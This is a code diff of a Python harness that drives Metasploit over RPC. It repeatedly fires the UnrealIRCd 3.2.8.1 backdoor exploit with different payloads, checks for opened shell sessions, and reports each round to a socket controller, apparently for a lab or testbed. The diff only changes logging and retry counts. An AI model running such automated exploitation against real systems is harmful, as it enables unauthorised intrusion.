@@ -33,27 +33,30 @@ def exploit(explt, payload):
 		return False
 	print("have job id")
 	if len(client.sessions.list) > 0:
+		print("success")
 		return True
-	for i in range(7):
+	for i in range(4):
 		time.sleep(0.5)
 		if len(client.sessions.list) > 0:
+			print("success after " + str(i) + " checks")
 			return True
+	if len(client.jobs.list) > 0:
+		print("job still at server")
+	else:
+		print("failed")
 	return False
 
 
 if __name__ == '__main__':
-	counter = 0
 	i = 0
 	explt = get_exploit('unix/irc/unreal_ircd_3281_backdoor')
 	sock.bind(server_address)
 	sock.listen(5)
 	client_sock, addr = sock.accept()
 	client_sock.sendall('ready')
-	print("ready for round 0")
 	while True:
 		cmd = client_sock.recv(100)
 		if cmd == 'start':
-			print("   round " + str(counter) + ": starting exploit")
 			payload = explt.payloads[i]
 			# i = (i + 1) % 4;
 			is_succeeded = exploit(explt, payload)
@@ -62,8 +65,6 @@ if __name__ == '__main__':
 			stop_all_sessions()
 			client_sock.sendall('success' if is_succeeded else 'failure')
 			client_sock.sendall('ready')
-			counter += 1
-			print("ready for round " + str(counter))
 		elif cmd == 'stop':
 			break
 	client_sock.close()
